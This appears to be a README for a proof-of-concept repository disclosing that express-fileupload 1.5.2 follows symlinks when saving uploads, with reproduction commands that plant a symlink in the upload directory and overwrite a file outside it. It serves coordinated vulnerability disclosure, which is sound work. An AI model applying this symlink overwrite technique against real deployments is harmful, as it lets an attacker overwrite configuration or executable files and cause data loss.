# express-fileupload symlink overwrite PoC

This repository demonstrates that express-fileupload follows symbolic links
when saving uploaded files via mv().

If an attacker can place a symlink inside the upload destination directory,
an uploaded file can overwrite an arbitrary file writable by the Node.js process.

Tested version: express-fileupload 1.5.2


## Impact

Arbitrary file overwrite with the privileges of the running Node.js process.

Depending on the deployment environment, this may allow:

- application configuration overwrite
- data loss / denial of service
- overwriting executable files that are later loaded by the application


## Install

npm install


## Reproduction Steps

### 1) Start the vulnerable server

rm -rf /tmp/efu-temp /tmp/efu-target
mkdir -p /tmp/efu-temp /tmp/efu-target uploads

node server.js

Expected output:

PoC server listening on http://127.0.0.1:3100


### 2) Plant a symlink inside the upload directory

rm -f uploads/ok.txt
ln -s /tmp/efu-target/pwned.txt uploads/ok.txt

ls -l uploads/ok.txt

Expected:

uploads/ok.txt -> /tmp/efu-target/pwned.txt


### 3) Upload a file named ok.txt

node client.js


### 4) Verify that the file outside the upload directory was overwritten

cat /tmp/efu-target/pwned.txt

Expected result:

OK

This confirms that the upload write followed the symlink and overwrote a file
outside the configured upload directory.


## Why this matters

This becomes exploitable in real deployments where an attacker can create or
influence files inside the upload directory, for example:

- shared or multi-tenant hosting
- shared container volumes
- CI/CD workspaces
- misconfigured directory permissions


## Files in this repository

server.js  - minimal vulnerable server  
client.js  - upload script


## Disclosure

This PoC was created for coordinated vulnerability disclosure.

Refer to the official GitHub Security Advisory for full details once published.
